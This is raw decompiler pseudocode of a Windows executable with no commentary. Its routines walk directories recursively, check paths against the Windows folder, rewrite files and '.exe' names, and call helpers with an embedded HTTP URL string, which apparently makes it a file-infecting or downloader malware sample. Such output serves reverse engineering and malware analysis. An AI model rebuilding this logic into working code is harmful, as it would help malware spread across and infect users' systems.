  sub_402C50(2, v5, 0, -2147483644, v29);
  if ( lpExistingFileName_4c )
    sub_40237D(lpExistingFileName_4c);
  v47 = sub_402B10();
  lp = sub_402BB0();
  lpExistingFileName_4d = (CHAR *)sub_40106B((char)v47);
  if ( v47 )
    sub_40237D(v47);
  if ( lp )
    sub_40237D(lp);
  v6 = lpExistingFileName_4d;
  if ( !lpExistingFileName_4d )
    v6 = (const CHAR *)&unk_42530E;
  lpExistingFileName = (LPCSTR)sub_402C70(1, v6);
  if ( lpExistingFileName_4d )
    sub_40237D(lpExistingFileName_4d);
  if ( lpExistingFileName != (LPCSTR)172168 )
  {
    v7 = lpNewFileName;
    if ( !lpNewFileName )
      v7 = (const CHAR *)&unk_42530E;
    v47 = sub_402CC0(1, v7);
    v8 = lpNewFileName;
    if ( !lpNewFileName )
      v8 = (const CHAR *)&unk_42530E;
    v9 = (double)(int)sub_402C70(1, v8) - dbl_42530F;
    v30 = sub_4010C7(v9);
    v10 = v47;
    if ( !v47 )
      v10 = dword_425317;
    v39 = sub_402D30(2, (int)v10, 0, -2147483643, v30);
    if ( v47 )
      sub_40237D(v47);
    v49 = v39;
    LOBYTE(v11) = (_BYTE)v39;
    if ( !v39 )
      v11 = dword_425317;
    v31 = (char)v11;
    v12 = lpFileName;
    if ( !lpFileName )
      v12 = (const CHAR *)&unk_42530E;
    sub_402D60(2, v12, 0, -2147483644, v31);
    v13 = (CHAR *)lpFileName;
    if ( !lpFileName )
      v13 = (CHAR *)&unk_42530E;
    sub_402E00(3, v13, 0, -2147483644, 0, 0, -2147483646, 0, 0, 0);
  }
  v14 = ::lpFileName;
  if ( !::lpFileName )
    v14 = (const CHAR *)&unk_42530E;
  v36 = sub_402CC0(1, v14);
  if ( ::lp )
    sub_40237D(::lp);
  ::lp = v36;
  v47 = aHttpWwwBlackie;
  sub_4017D8((_DWORD **)&v47);
  if ( v47 )
    sub_40237D(v47);
  sub_4018DD();
  v47 = (void *)sub_402680((void (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_404310, 1, 0, 0, -2147482879);
  v37 = v47;
  v34 = dword_425560;
  v15 = *(char **)dword_425560;
  v16 = (void **)((char *)dword_425560 + 4);
  v17 = *(_DWORD *)dword_425560 == 0;
  if ( *(_DWORD *)dword_425560 )
  {
    for ( i = (int)*v16; ; i *= (_DWORD)*v16 )
    {
      ++v16;
      if ( !--v15 )
        break;
    }
    v15 = (char *)i;
    v17 = i == 0;
  }
  if ( !v17 )
  {
    do
    {
      v32 = v15;
      if ( *v16 )
        sub_40237D(*v16);
      ++v16;
      v15 = v32 - 1;
    }
    while ( v32 != (char *)1 );
  }
  sub_40237D(v34);
  dword_425560 = v37;
  v19 = sub_4010EE((int *)v37);
  v20 = 0;
  v21 = &v48;
  while ( 1 )
  {
    v38 = v20 + 1;
    v35 = v21;
    *v21 = v20 + 1;
    v33 = v19;
    if ( v20 + 1 > v19 )
      break;
    v22 = (char *)dword_425560;
    sub_401107((int *)dword_425560);
    v27 = v23;
    v24 = v48 - 1;
    if ( v48 - 1 < 0 )
      v24 = sub_402389(4);
    if ( v24 >= v27 )
      v24 = sub_402389(1);
    v47 = &v22[4 * v24];
    lp = aExe_0;
    sub_401981((void **)v47, (int)&lp, 1);
    if ( lp )
      sub_40237D(lp);
    v19 = v33;
    v21 = v35;
    v20 = v38;
  }
  v25 = (void *)sub_402680((void (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_407D70, 1, aHttpWwwBlackie_0, 0, -2147483644);
  if ( v25 )
    sub_40237D(v25);
  if ( lpFileName )
    sub_40237D((void *)lpFileName);
  if ( lpNewFileName )
    sub_40237D((void *)lpNewFileName);
  if ( v49 )
    sub_40237D(v49);
  return 0;
}
// 401127: could not find valid save-restore pair for ebx
// 401200: conditional instruction was optimized away because %lpFileName.4==0
// 4012A4: conditional instruction was optimized away because %lpNewFileName.4==0
// 401574: conditional instruction was optimized away because %var_C.4==0
// 401709: variable 'v23' is possibly undefined
// 402389: using guessed type _DWORD __cdecl sub_402389(_DWORD);
// 42530F: using guessed type double dbl_42530F;
// 425317: using guessed type _DWORD dword_425317[2];

//----- (004017D8) --------------------------------------------------------
__int64 __stdcall sub_4017D8(_DWORD **a1)
{
  _DWORD *v1; // eax
  char *v2; // eax
  int *v3; // eax
  _DWORD *v4; // eax
  unsigned int v6; // [esp-8h] [ebp-10h]
  _DWORD *v7; // [esp-4h] [ebp-Ch]
  const CHAR *v8; // [esp-4h] [ebp-Ch]
  _DWORD *v9; // [esp+0h] [ebp-8h]
  int *lp; // [esp+4h] [ebp-4h]

  v1 = *a1;
  if ( *a1 )
  {
    v7 = *a1;
    v2 = sub_401000(v1);
    v1 = (_DWORD *)sub_402383((SIZE_T)(v2 + 1));
    qmemcpy(v1, v7, v6);
  }
  v8 = (const CHAR *)v1;
  if ( lpFileName )
    sub_40237D((void *)lpFileName);
  lpFileName = v8;
  v3 = (int *)sub_40106B((char)aUrl);
  lp = v3;
  if ( !v3 )
    v3 = (int *)&unk_42530E;
  v9 = sub_402FD0(1, v3, 0, 0x80000004);
  if ( lp )
    sub_40237D(lp);
  LOBYTE(v4) = (_BYTE)v9;
  if ( !v9 )
    v4 = dword_425317;
  sub_402D60(2, FileName, 0, -2147483644, (char)v4);
  if ( v9 )
    sub_40237D(v9);
  return sub_402680(sub_4044A0, 1, FileName, 0, -2147483644);
}
// 4017FD: variable 'v6' is possibly undefined
// 425317: using guessed type _DWORD dword_425317[2];

//----- (004018DD) --------------------------------------------------------
void sub_4018DD()
{
  ;
}

//----- (004018E4) --------------------------------------------------------
int __cdecl sub_4018E4(__int16 *a1, _BYTE *a2)
{
  __int16 *v2; // edx
  _BYTE *v3; // ecx
  int result; // eax
  unsigned int v5; // eax
  bool v6; // cf
  unsigned int v7; // eax
  __int16 v8; // ax

  v2 = a1;
  v3 = a2;
  if ( a1 )
  {
    if ( !a2 )
      return *(_BYTE *)a1 != 0;
    if ( ((unsigned __int8)a1 & 3) == 0 )
      goto LABEL_9;
    if ( ((unsigned __int8)a1 & 1) != 0 )
    {
      v2 = (__int16 *)((char *)a1 + 1);
      v6 = *(_BYTE *)a1 < *a2;
      if ( *(_BYTE *)a1 != *a2 )
        return -2 * v6 + 1;
      v3 = a2 + 1;
      if ( !*(_BYTE *)a1 )
        return 0;
      if ( ((unsigned __int8)v2 & 2) == 0 )
        goto LABEL_9;
    }
    v8 = *v2++;
    v6 = (unsigned __int8)v8 < *v3;
    if ( (_BYTE)v8 == *v3 )
    {
      if ( !(_BYTE)v8 )
        return 0;
      v6 = HIBYTE(v8) < v3[1];
      if ( HIBYTE(v8) == v3[1] )
      {
        if ( HIBYTE(v8) )
        {
LABEL_9:
          for ( v3 += 2; ; v3 += 4 )
          {
            v5 = *(_DWORD *)v2;
            v6 = (unsigned __int8)*(_DWORD *)v2 < *v3;
            if ( (unsigned __int8)*(_DWORD *)v2 != *v3 )
              break;
            if ( !(_BYTE)v5 )
              return 0;
            v6 = BYTE1(v5) < v3[1];
            if ( BYTE1(v5) != v3[1] )
              break;
            if ( !BYTE1(v5) )
              return 0;
            v7 = HIWORD(v5);
            v6 = (unsigned __int8)v7 < v3[2];
            if ( (_BYTE)v7 != v3[2] )
              break;
            if ( !(_BYTE)v7 )
              return 0;
            v6 = BYTE1(v7) < v3[3];
            if ( BYTE1(v7) != v3[3] )
              break;
            v2 += 2;
            if ( !BYTE1(v7) )
              return 0;
          }
          return -2 * v6 + 1;
        }
        return 0;
      }
    }
    return -2 * v6 + 1;
  }
  result = 0;
  if ( a2 )
  {
    if ( *a2 )
      return -1;
  }
  return result;
}

//----- (00401981) --------------------------------------------------------
HANDLE __stdcall sub_401981(void **a1, int a2, int a3)
{
  const char *v3; // eax
  LPCSTR v4; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  _DWORD *v7; // eax
  const char *v8; // eax
  const CHAR *v9; // eax
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  const CHAR *v14; // eax
  const CHAR *v15; // eax
  LPCSTR v16; // eax
  LPCSTR v17; // eax
  const CHAR *v18; // eax
  const char *v19; // eax
  HANDLE result; // eax
  const CHAR *v21; // [esp-18h] [ebp-44h]
  const CHAR *v22; // [esp-18h] [ebp-44h]
  const CHAR *v23; // [esp-Ch] [ebp-38h]
  unsigned int v24; // [esp-8h] [ebp-34h]
  CHAR *v25; // [esp-4h] [ebp-30h]
  const CHAR *v26; // [esp-4h] [ebp-30h]
  CHAR *v27; // [esp-4h] [ebp-30h]
  CHAR *v28; // [esp-4h] [ebp-30h]
  void *v29; // [esp-4h] [ebp-30h]
  void *v30; // [esp-4h] [ebp-30h]
  void *v31; // [esp-4h] [ebp-30h]
  CHAR *v32; // [esp-4h] [ebp-30h]
  void *v33; // [esp-4h] [ebp-30h]
  HANDLE hFindFile; // [esp+0h] [ebp-2Ch] BYREF
  LPCSTR lpString; // [esp+4h] [ebp-28h]
  LPCSTR v36[2]; // [esp+8h] [ebp-24h]
  void *lp; // [esp+10h] [ebp-1Ch] BYREF
  HANDLE *v38; // [esp+14h] [ebp-18h]
  void *v39; // [esp+18h] [ebp-14h]
  void *v40; // [esp+1Ch] [ebp-10h]
  void *v41; // [esp+20h] [ebp-Ch]
  LPCSTR lpFileName; // [esp+24h] [ebp-8h]
  void *v43; // [esp+28h] [ebp-4h]

  hFindFile = 0;
  v43 = 0;
  lpFileName = 0;
  v41 = 0;
  v40 = 0;
  v39 = 0;
  v38 = 0;
  sub_403090();
  if ( sub_4018E4((__int16 *)*a1, &unk_42530E) )
  {
    v3 = (const char *)*a1;
    if ( !*a1 )
      v3 = (const char *)&unk_42530E;
    lp = sub_403100(2, v3, 0, -2147483644, 1);
    v36[1] = (LPCSTR)(sub_4018E4((__int16 *)lp, asc_42530C) != 0);
    if ( lp )
      sub_40237D(lp);
    if ( v36[1] )
    {
      lp = (void *)sub_40106B((char)*a1);
      if ( *a1 )
        sub_40237D(*a1);
      *a1 = lp;
    }
    lp = (void *)sub_40106B((char)*a1);
    v36[1] = (LPCSTR)sub_403170((LPCSTR)lp, 32, 0, &hFindFile);
    if ( lp )
      sub_40237D(lp);
    v25 = (CHAR *)v36[1];
    if ( v43 )
      sub_40237D(v43);
    v43 = v25;
    while ( sub_4018E4((__int16 *)v43, &unk_42530E) )
    {
      lp = (void *)sub_40106B((char)*a1);
      v26 = (const CHAR *)lp;
      if ( lpFileName )
        sub_40237D((void *)lpFileName);
      lpFileName = v26;
      lp = sub_4032E0(1, aWindir);
      v36[1] = (LPCSTR)sub_40106B((char)lp);
      if ( lp )
        sub_40237D(lp);
      v4 = lpFileName;
      if ( !lpFileName )
        v4 = (LPCSTR)&unk_42530E;
      v21 = v4;
      v5 = v36[1];
      if ( !v36[1] )
        v5 = (const CHAR *)&unk_42530E;
      v36[0] = (LPCSTR)sub_403340(4, v5, 0, -2147483644, AppName, 0, -2147483644, v21, 0, -2147483644, 0);
      if ( v36[1] )
        sub_40237D((void *)v36[1]);
      v27 = (CHAR *)v36[0];
      if ( v41 )
        sub_40237D(v41);
      v41 = v27;
      v6 = lpFileName;
      if ( !lpFileName )
        v6 = (const CHAR *)&unk_42530E;
      v7 = sub_402CC0(1, v6);
      lp = v7;
      if ( !v7 )
        v7 = dword_425317;
      v36[1] = (LPCSTR)sub_402680((void (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_4049B0, 1, v7, 0, -2147483643);
      if ( lp )
        sub_40237D(lp);
      v28 = (CHAR *)v36[1];
      if ( v40 )
        sub_40237D(v40);
      v40 = v28;
      if ( sub_4018E4((__int16 *)v41, v28) )
      {
        v8 = (const char *)*a1;
        if ( !*a1 )
          v8 = (const char *)&unk_42530E;
        lp = sub_403100(2, v8, 0, -2147483644, 10);
        v36[1] = sub_4032E0(1, aWindir);
        v36[0] = (LPCSTR)(sub_4018E4((__int16 *)lp, v36[1]) != 0);
        if ( lp )
          sub_40237D(lp);
        if ( v36[1] )
          sub_40237D((void *)v36[1]);
        if ( v36[0] )
        {
          lp = sub_4032E0(1, aWindir);
          v36[1] = (LPCSTR)sub_40106B((char)lp);
          if ( lp )
            sub_40237D(lp);
          v36[0] = (LPCSTR)(sub_4018E4((__int16 *)*a1, v36[1]) != 0);
          if ( v36[1] )
            sub_40237D((void *)v36[1]);
          if ( v36[0] )
          {
            v9 = lpFileName;
            if ( !lpFileName )
              v9 = (const CHAR *)&unk_42530E;
            *(double *)v36 = (double)(int)sub_402C70(1, v9);
            if ( *(double *)v36 - dbl_42551C < dbl_425524 )
            {
              v10 = lpFileName;
              if ( !lpFileName )
                v10 = (const CHAR *)&unk_42530E;
              lp = sub_402CC0(1, v10);
              v29 = lp;
              if ( v39 )
                sub_40237D(v39);
              v39 = v29;
              sub_403090();
              v11 = lpFileName;
              if ( !lpFileName )
                v11 = (const CHAR *)&unk_42530E;
              v38 = (HANDLE *)sub_4033E0(3, v11, 0, -2147483644, 4, 0, -2147482879, 0, 0, 0);
              LOBYTE(v12) = (_BYTE)::lp;
              if ( !::lp )
                v12 = dword_425317;
              sub_4034C0(3, v38, 0, -2147482879, (char)v12);
              v13 = dword_425317;
              if ( dword_425317 )
              {
                v13 = (_DWORD *)sub_402383(dword_425317[1] + 8);
                qmemcpy(v13, dword_425317, v24);
              }
              v30 = v13;
              if ( v39 )
                sub_40237D(v39);
              v39 = v30;
              lp = sub_4032E0(1, aWindir);
              v36[1] = (LPCSTR)sub_40106B((char)lp);
              if ( lp )
                sub_40237D(lp);
              v14 = lpFileName;
              if ( !lpFileName )
                v14 = (const CHAR *)&unk_42530E;
              v15 = (const CHAR *)sub_402CC0(1, v14);
              v36[0] = v15;
              if ( !v15 )
                v15 = (const CHAR *)dword_425317;
              lpString = (LPCSTR)sub_402680(
                                   (void (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_4049B0,
                                   1,
                                   v15,
                                   0,
                                   -2147483643);
              if ( v36[0] )
                sub_40237D((void *)v36[0]);
              v16 = lpString;
              if ( !lpString )
                v16 = (LPCSTR)&unk_42530E;
              v23 = v16;
              v17 = lpFileName;
              if ( !lpFileName )
                v17 = (LPCSTR)&unk_42530E;
              v22 = v17;
              v18 = v36[1];
              if ( !v36[1] )
                v18 = (const CHAR *)&unk_42530E;
              sub_4035A0(4, v18, 0, -2147483644, AppName, 0, -2147483644, v22, 0, -2147483644, v23);
              if ( v36[1] )
                sub_40237D((void *)v36[1]);
              if ( lpString )
                sub_40237D((void *)lpString);
              sub_4035C0(1, v38);
              sub_402253();
            }
          }
        }
      }
      lp = (void *)sub_403170(0, 0, 1, &hFindFile);
      v31 = lp;
      if ( v43 )
        sub_40237D(v43);
      v43 = v31;
      sub_403090();
    }
    lp = (void *)sub_40106B((char)*a1);
    v36[1] = (LPCSTR)sub_403170((LPCSTR)lp, 16, 0, &hFindFile);
    if ( lp )
      sub_40237D(lp);
    v32 = (CHAR *)v36[1];
    if ( v43 )
      sub_40237D(v43);
    v43 = v32;
    while ( sub_4018E4((__int16 *)v43, &unk_42530E) )
    {
      v19 = (const char *)v43;
      if ( !v43 )
        v19 = (const char *)&unk_42530E;
      v36[1] = (LPCSTR)sub_4035D0(4, v19, 0, -2147483644, asc_425530, 0, -2147483644, 0, 0, 0, 0);
      if ( v36[1] == (LPCSTR)-1 )
      {
        lp = (void *)sub_40106B((char)*a1);
        sub_401981(&lp, a2, 1);
        if ( lp )
          sub_40237D(lp);
      }
      lp = (void *)sub_403170(0, 16, 0, &hFindFile);
      v33 = lp;
      if ( v43 )
        sub_40237D(v43);
      v43 = v33;
      sub_403090();
    }
  }
  result = sub_4032C0(hFindFile);
  if ( v43 )
    result = (HANDLE)sub_40237D(v43);
  if ( lpFileName )
    result = (HANDLE)sub_40237D((void *)lpFileName);
  if ( v41 )
    result = (HANDLE)sub_40237D(v41);
  if ( v40 )
    result = (HANDLE)sub_40237D(v40);
  if ( v39 )
    return (HANDLE)sub_40237D(v39);
  return result;
}
// 401981: could not find valid save-restore pair for ebx
// 401EED: variable 'v24' is possibly undefined
// 425317: using guessed type _DWORD dword_425317[2];
// 42551C: using guessed type double dbl_42551C;
// 425524: using guessed type double dbl_425524;

//----- (00402253) --------------------------------------------------------
int sub_402253()
{
  int result; // eax
  int *v1; // [esp+0h] [ebp-4h] BYREF

  v1 = (int *)&v1;
  result = SetProcessWorkingSetSize((HANDLE)0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF);
  if ( v1 != (int *)&v1 )
    return sub_402389(6);
  return result;
}
// 402389: using guessed type _DWORD __cdecl sub_402389(_DWORD);

//----- (0040228E) --------------------------------------------------------
int sub_40228E()
{
  sub_4022A4();
  return 0;
}

//----- (004022A4) --------------------------------------------------------
void sub_4022A4()
{
  ;
}

//----- (004022AB) --------------------------------------------------------
int sub_4022AB()
{
  _DWORD *v0; // eax
  _DWORD *v1; // edi
  int result; // eax

  v0 = (_DWORD *)sub_402383(8u);
  dword_425560 = v0;
  *v0 = dword_425317[0];
  v1 = v0 + 1;
  result = dword_425317[1];
  *v1 = result;
  return result;
}
// 425317: using guessed type _DWORD dword_425317[2];

//----- (004022C9) --------------------------------------------------------
int sub_4022C9()
{
  char *v0; // ecx
  void **v1; // ebx
  bool v2; // zf
  int i; // eax
  char *v5; // [esp-8h] [ebp-8h]
  void *v6; // [esp-4h] [ebp-4h]

  if ( lpFileName )
    sub_40237D((void *)lpFileName);
  if ( lp )
    sub_40237D(lp);
  v6 = dword_425560;
  v0 = *(char **)dword_425560;
  v1 = (void **)((char *)dword_425560 + 4);
  v2 = *(_DWORD *)dword_425560 == 0;
  if ( *(_DWORD *)dword_425560 )
  {
    for ( i = (int)*v1; ; i *= (_DWORD)*v1 )
    {
      ++v1;
      if ( !--v0 )
        break;
    }
    v0 = (char *)i;
    v2 = i == 0;
  }
  if ( !v2 )
  {
    do
    {
      v5 = v0;
      if ( *v1 )
        sub_40237D(*v1);
      ++v1;
      v0 = v5 - 1;
    }
    while ( v5 != (char *)1 );
  }
  return sub_40237D(v6);
}

//----- (00402338) --------------------------------------------------------
int sub_402338()
{
  int v1; // [esp-4h] [ebp-4h]

  __asm { fninit }
  sub_4022AB();
  sub_402660((int)sub_4022C9);
  sub_40228E();
  v1 = sub_401127();
  nullsub_1();
  return sub_40236B(v1);
}
// 402371: using guessed type int nullsub_1(void);

//----- (004023B0) --------------------------------------------------------
void ***sub_4023B0()
{
  return &off_41F408;
}
// 41F408: using guessed type void **off_41F408;

//----- (004023E0) --------------------------------------------------------
LPVOID __thiscall sub_4023E0(LPVOID lpMem, char a2)
{
  sub_402400();
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}
// 402400: using guessed type int sub_402400(void);

//----- (00402410) --------------------------------------------------------
int sub_402410()
{
  unknown_libname_1();
  return atexit(unknown_libname_2);
}
// 402420: using guessed type int unknown_libname_1(void);

//----- (00402450) --------------------------------------------------------
int sub_402450()
{
  _DWORD v1[2]; // [esp+0h] [ebp-8h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  sub_402480();
  dword_42AD18 = (int)v1;
  dword_42AD1C = (int)&savedregs;
  v1[1] = sub_402338();
  return sub_41C473();
}
// 42AD18: using guessed type int dword_42AD18;
// 42AD1C: using guessed type int dword_42AD1C;

//----- (00402480) --------------------------------------------------------
int (__stdcall *sub_402480())(int, int, int)
{
  int (__stdcall *result)(int, int, int); // eax
  int (__stdcall **i)(int, int, int); // esi

  hHeap = GetProcessHeap();
  result = off_4250F4[0];
  for ( i = off_4250F4; result; ++i )
  {
    result(1, (int)off_4250F0, 0);
    result = i[1];
  }
  return result;
}
// 4250F0: using guessed type int (__stdcall *off_4250F0)(int, LPVOID lpMem, SIZE_T dwBytes);
// 4250F4: using guessed type int (__stdcall *off_4250F4[3])(int, int, int);

//----- (00402490) --------------------------------------------------------
int (*sub_402490())(void)
{
  int (__stdcall *v0)(int, int, int); // eax
  int (__stdcall **i)(int, int, int); // esi
  int (*result)(void); // eax

  if ( dword_42AD30 )
    dword_42AD30();
  if ( dword_42AD34 )
    dword_42AD34();
  if ( dword_42AD38 )
    dword_42AD38();
  v0 = off_4250F4[0];
  for ( i = off_4250F4; v0; ++i )
  {
    v0(6, 0, 0);
    v0 = i[1];
  }
  result = dword_42AD40;
  if ( dword_42AD40 )
    return (int (*)(void))dword_42AD40();
  return result;
}
// 42AD30: invalid function type '?' has been ignored
// 4250F4: using guessed type int (__stdcall *off_4250F4[3])(int, int, int);
// 42AD30: using guessed type int (*dword_42AD30)(void);
// 42AD34: using guessed type int (*dword_42AD34)(void);
// 42AD38: using guessed type int (*dword_42AD38)(void);
// 42AD40: using guessed type int (*dword_42AD40)(void);

//----- (004024C0) --------------------------------------------------------
HMODULE sub_4024C0()
{
  HMODULE result; // eax
  int v1; // ecx

  result = (HMODULE)lpModuleName;
  if ( !lpModuleName )
    result = GetModuleHandleA(0);
  v1 = *(_DWORD *)((char *)result + *((_DWORD *)result + 15) + 80);
  dword_42AD24 = (int)result;
  dword_42AD2C = v1;
  dword_42AD20 = (int)result + v1;
  return result;
}
// 42AD20: using guessed type int dword_42AD20;
// 42AD24: using guessed type int dword_42AD24;
// 42AD2C: using guessed type int dword_42AD2C;

//----- (004024F0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
UINT __cdecl sub_4024F0()
{
  UINT retaddr; // [esp+4h] [ebp+4h]

  sub_402490();
  if ( !dword_42AD18 )
    ExitProcess(retaddr);
  return retaddr;
}
// 40251C: positive sp value 4 has been found
// 42AD18: using guessed type int dword_42AD18;

//----- (00402530) --------------------------------------------------------
UINT __usercall sub_402530@<eax>(int a1@<ebx>, int a2)
{
  CHAR Text[256]; // [esp+0h] [ebp-104h] BYREF
  int v4; // [esp+100h] [ebp-4h]

  v4 = a1;
  wsprintfA(Text, "program internal error number is %d. (0x%Xh)", a2, a1);
  MessageBoxA(0, Text, Caption, 0x10u);
  return sub_4024F0();
}

//----- (00402580) --------------------------------------------------------
LPVOID __cdecl sub_402580(SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax
  LPVOID v2; // esi

  ProcessHeap = hHeap;
  if ( !hHeap )
  {
    ProcessHeap = GetProcessHeap();
    hHeap = ProcessHeap;
  }
  v2 = HeapAlloc(ProcessHeap, 8u, dwBytes);
  if ( !v2 )
  {
    MessageBoxA(0, Text, Caption, 0x10u);
    sub_4024F0();
  }
  return v2;
}

//----- (004025D0) --------------------------------------------------------
LPVOID __cdecl sub_4025D0(LPVOID lpMem, SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = hHeap;
  if ( !hHeap )
  {
    ProcessHeap = GetProcessHeap();
    hHeap = ProcessHeap;
  }
  if ( lpMem )
    return HeapReAlloc(ProcessHeap, 0, lpMem, dwBytes);
  else
    return HeapAlloc(ProcessHeap, 8u, dwBytes);
}

//----- (00402610) --------------------------------------------------------
void __cdecl sub_402610(void *lp)
{
  if ( (unsigned int)lp > 0xFFFF )
  {
    if ( !dword_42AD2C )
      sub_4024C0();
    if ( (dword_42AD24 > (unsigned int)lp || (unsigned int)lp > dword_42AD20) && !IsBadReadPtr(lp, 8u) )
      HeapFree(hHeap, 0, lp);
  }
}
// 42AD20: using guessed type int dword_42AD20;
// 42AD24: using guessed type int dword_42AD24;
// 42AD2C: using guessed type int dword_42AD2C;

//----- (00402660) --------------------------------------------------------
int __cdecl sub_402660(int a1)
{
  int result; // eax

  result = a1;
  dword_42AD30 = a1;
  return result;
}
// 42AD30: using guessed type int dword_42AD30;

//----- (00402680) --------------------------------------------------------
__int64 __usercall sub_402680@<edx:eax>(void (__cdecl *a1)(_DWORD, _DWORD, _DWORD)@<eax>, int a2, ...)
{
  __int64 v3; // [esp+0h] [ebp-10h] BYREF
  int v4; // [esp+8h] [ebp-8h]
  void (__cdecl *v5)(_DWORD, _DWORD, _DWORD); // [esp+Ch] [ebp-4h]
  va_list va; // [esp+1Ch] [ebp+Ch] BYREF

  va_start(va, a2);
  v5 = a1;
  v3 = 0i64;
  v4 = 0;
  a1(&v3, a2, va);
  return v3;
}

//----- (00402720) --------------------------------------------------------
void __cdecl sub_402720(int a1, unsigned int Seed, int a3, int a4)
{
  unsigned int TickCount; // eax

  if ( a4 )
  {
    srand(Seed);
  }
  else
  {
    TickCount = GetTickCount();
    srand(TickCount);
  }
}

//----- (00402750) --------------------------------------------------------
int __cdecl sub_402750(int a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v7; // esi
  int v8; // eax
  int v9; // ecx
  int v11; // eax
  int v12; // edi

  if ( a4 )
    v7 = a2 < 0 ? 0 : a2;
  else
    v7 = 0;
  if ( a7 )
    v8 = a5 < 0 ? 0 : a5;
  else
    v8 = 0x7FFFFFFF;
  v9 = v7;
  if ( v7 >= v8 )
    v7 = v8;
  if ( v9 > v8 )
    v8 = v9;
  if ( v7 == v8 )
    return v7;
  v11 = v8 - v7;
  v12 = 2147483646;
  if ( v11 != 0x7FFFFFFF )
    v12 = v11;
  return v7 + (int)abs32(VC8_Random_40B22F()) % (v12 + 1);
}

//----- (004027D0) --------------------------------------------------------
int *__cdecl sub_4027D0(int *a1, int a2)
{
  int *v2; // esi
  int *result; // eax
  unsigned int v4; // ebx

  v2 = sub_403C00(a1, (int *)&a1);
  result = a1;
  if ( a1 )
  {
    v4 = 0;
    if ( !(a2 * (_DWORD)a1) )
      return 0;
    do
    {
      if ( !*((_BYTE *)v2 + v4) )
        break;
      ++v4;
    }
    while ( v4 < a2 * (int)a1 );
    if ( v4 )
    {
      result = (int *)sub_402580(v4 + 1);
      qmemcpy(result, v2, v4);
      *((_BYTE *)result + v4) = 0;
    }
    else
    {
      return 0;
    }
  }
  return result;
}

//----- (00402840) --------------------------------------------------------
int *__cdecl sub_402840(int a1, double X, unsigned int a3)
{
  char *v3; // ebx
  unsigned int v4; // eax
  int v5; // eax
  unsigned int v7; // kr10_4
  unsigned int v8; // ecx
  char *v9; // edi
  const char *v10; // edi
  unsigned int v11; // kr18_4
  char Buffer[260]; // [esp+14h] [ebp-104h] BYREF

  v3 = 0;
  if ( (a3 & 0x20000000) != 0x20000000 )
  {
    if ( a3 > 0x80000101 )
    {
      if ( a3 > 0x80000401 )
      {
        if ( a3 == -2147482367 )
        {
          sprintf(Buffer, "%f", *(float *)&X);
          sub_403C30(Buffer);
        }
        else
        {
          if ( a3 != -2147482111 )
            return (int *)v3;
          sprintf(Buffer, "%lf", X);
          sub_403C30(Buffer);
        }
      }
      else
      {
        switch ( a3 )
        {
          case 0x80000401:
            sprintf(Buffer, "%I64d", X);
            break;
          case 0x80000201:
            sprintf(Buffer, "%d", SLOWORD(X));
            break;
          case 0x80000301:
LABEL_29:
            sprintf(Buffer, "%d", LODWORD(X));
            break;
          default:
            return (int *)v3;
        }
      }
    }
    else
    {
      if ( a3 != -2147483391 )
      {
        switch ( a3 )
        {
          case 0x80000002:
            v10 = asc_4255C0;
            if ( !LODWORD(X) )
              v10 = asc_4255BC;
            strcpy(Buffer, v10);
            goto LABEL_36;
          case 0x80000003:
            sub_403C70(Buffer, X, 0);
            v11 = strlen(Buffer) + 1;
            v8 = v11 - 1;
            if ( v11 != 1 )
              goto LABEL_37;
            return (int *)v3;
          case 0x80000004:
            v7 = strlen((const char *)LODWORD(X)) + 1;
            v8 = v7 - 1;
            if ( v7 == 1 )
              return (int *)v3;
            v9 = (char *)LODWORD(X);
            goto LABEL_38;
          case 0x80000005:
            return sub_4027D0((int *)LODWORD(X), 1);
          case 0x80000006:
            goto LABEL_29;
          default:
            return (int *)v3;
        }
      }
      sprintf(Buffer, "%d", LOBYTE(X));
    }
LABEL_36:
    v8 = strlen(Buffer);
LABEL_37:
    v9 = Buffer;
LABEL_38:
    if ( v9 )
    {
      if ( v8 )
      {
        v3 = (char *)sub_402580(v8 + 1);
        strcpy(v3, v9);
      }
    }
    return (int *)v3;
  }
  v4 = a3 & 0xDFFFFFFF;
  if ( (a3 & 0xDFFFFFFF) > 0x80000201 )
  {
    if ( v4 != -2147482879 )
    {
      if ( v4 == -2147482623 )
      {
        v5 = 8;
        return sub_4027D0((int *)LODWORD(X), v5);
      }
      return (int *)v3;
    }
LABEL_11:
    v5 = 4;
    return sub_4027D0((int *)LODWORD(X), v5);
  }
  switch ( v4 )
  {
    case 0x80000201:
      v5 = 2;
      return sub_4027D0((int *)LODWORD(X), v5);
    case 0x80000006:
      goto LABEL_11;
    case 0x80000101:
      v5 = 1;
      return sub_4027D0((int *)LODWORD(X), v5);
  }
  return (int *)v3;
}

//----- (00402B10) --------------------------------------------------------
char *sub_402B10()
{
  CHAR *v0; // eax
  char v1; // cl
  char *v2; // edx
  CHAR Filename[260]; // [esp+8h] [ebp-104h] BYREF

  if ( GetModuleFileNameA(0, Filename, 0x104u) )
  {
    v0 = &Filename[strlen(Filename) - 1];
    if ( *v0 == 92 )
    {
LABEL_5:
      *v0 = 0;
    }
    else
    {
      while ( v0 > Filename )
      {
        v1 = *--v0;
        if ( v1 == 92 )
          goto LABEL_5;
      }
    }
  }
  v2 = (char *)sub_402580(strlen(Filename) + 1);
  strcpy(v2, Filename);
  return v2;
}
// 402B10: using guessed type CHAR Filename[260];

//----- (00402BB0) --------------------------------------------------------
char *sub_402BB0()
{
  CHAR *v0; // esi
  CHAR *v1; // eax
  char v2; // cl
  char *v3; // edx
  CHAR Filename[260]; // [esp+8h] [ebp-104h] BYREF

  v0 = Filename;
  if ( GetModuleFileNameA(0, Filename, 0x104u) )
  {
    v1 = &Filename[strlen(Filename) - 1];
    if ( *v1 == 92 )
    {
LABEL_5:
      v0 = v1 + 1;
    }
    else
    {
      while ( v1 > Filename )
      {
        v2 = *--v1;
